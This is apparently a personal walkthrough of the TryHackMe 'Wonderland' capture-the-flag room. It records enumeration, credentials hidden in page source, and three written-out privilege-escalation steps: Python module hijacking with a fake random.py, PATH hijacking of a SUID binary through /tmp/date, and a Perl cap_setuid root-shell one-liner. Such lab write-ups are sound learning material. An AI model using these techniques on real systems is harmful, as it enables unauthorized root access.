#tryhackme #ctf 
# Wonderland
---

## Nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)

Inspect page source
found:
/img
main.css

## Gobuster
/img
/r
/poem

/img -> director listing available
3 files:
    alice_door.jpg
    alice_door.png
    white_rabbit_1.jpg

/r:
> Keep Going.
>
> "Would you tell me, please, which way I ought to go from here?"

/poem -> a long boring poem

## Steghide
Using steghide to try to extract info from images
white\_rabbit\_1.jpg -> hint.txt

> follow the r a b b i t

## Feroxbuster
Found dir <machine-ip>/r/a/b/b/i/t

Inspect page source - found creds:
> alice:HowDothTheLittleCrocodileImproveHisShiningTail

Use the creds to ssh: ;)

**alice@wonderland**
found two files in $HOME:
-rw------- 1 root root   66 May 25  2020 root.txt
-rw-r--r-- 1 root root 3577 May 25  2020 walrus\_and\_the\_carpenter.py

`sudo -l`: 
> Matching Defaults entries for alice on wonderland:
>    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
>
> User alice may run the following commands on wonderland:
>     (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

We can read the walrus\_and\_the\_carpenter.py file
it starts with import random and prints 10  random lines from the poem

What if we make a random.py in the same directory so it gets executed when the script is run as rabbit
	
```python
# random.py

import os
os.system('/bin/bash')
```

now run this as 
`
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
`

Got shell as rabbit :o

Found 1 file with SUID:
-rwsr-sr-x 1 root root 16816 May 25  2020 teaParty

run this
`./teaParty`

> Welcome to the tea party!
> The Mad Hatter will be here soon.
> Probably by Fri, 17 Sep 2021 06:51:31 +0000
> Ask very nicely, and I will give you some tea while you wait for him

Read the binary: it is calling the 'date' binary without specifying the full path
We can make a date file in /tmp and add /tmp in the $PATH variable so the SUID binary will look inside /tmp when some binary is called

`
/tmp/date

#!/bin/bash
/bin/bash
`

Change permissions: chmod 777 /tmp/date

Got shell as Hatter :O

cd to /home/hatter
found password.txt
> WhyIsARavenLikeAWritingDesk?

ssh into hatter using the found passwd

run linpeas.sh again
found cap\_setuid available for /usr/bin/perl

use this to gain shell
`/usr/bin/perl -e "use POSIX qw(setuid); POSIX::setuid(0); exec '/bin/sh';"`

Gained root shell :D

cd into /home/alice/ to find root.txt

[DONE]
